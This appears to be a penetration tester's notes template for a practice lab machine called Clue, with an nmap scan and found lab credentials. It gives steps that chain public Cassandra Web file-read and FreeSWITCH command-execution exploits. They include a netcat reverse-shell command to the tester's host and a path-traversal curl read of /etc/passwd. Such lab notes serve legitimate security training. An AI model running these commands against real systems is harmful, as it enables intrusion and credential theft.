[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

```powershell
PORT     STATE SERVICE          VERSION


22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)


80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden


139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)


445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)


3000/tcp open  http             Thin httpd
|_http-title: Cassandra Web


8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 5.14 - 6.8 (91%), Linux 2.6.32 - 3.10 (91%), OpenWrt 22.03 (Linux 5.10) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2026-06-11T05:15:47-04:00
| smb2-time: 
|   date: 2026-06-11T09:15:46
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```


---
## Software Versions

```powershell

```


---
## Discovered Subdomains




---
## Discovered Credentials

anthony
cassie
root

```cassie
SecondBiteTheApple330
```

No SSH

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---
## Attack Angles





---
## Steps to User.txt

Port 3000 Cassandra Web 0.5.0 File Read https://www.exploit-db.com/exploits/49362

python3 49362.py 192.168.175.240 /etc/passwd

anthony
cassie
root

┌──(kali㉿kali)-[~/Desktop/PGPlay/Clue]
└─$ python3 49362.py 192.168.175.240 /proc/self/cmdline     

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330

Read /etc/freeswitch/autoload_configs/event_socket.conf.xml to find freeswitch password StrongClueConEight021, 

use exploit 47799.py to cmd execute and get rce

python3 47799.py 192.168.175.240 "nc 192.168.45.248 80 -e /bin/bash"


---
## Steps to root.txt

sudo /usr/local/bin/cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330

Open port 9999

you can interact with cassandra 9999 using ctrl+z ; bg and curl 0.0.0.0:9999

```
`curl --path-as-is http://0.0.0.0:9999/../../../../../../../../etc/passw`
```



```powershell
$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1
```

---

## User Flag

```

```

## Root Flag

```

```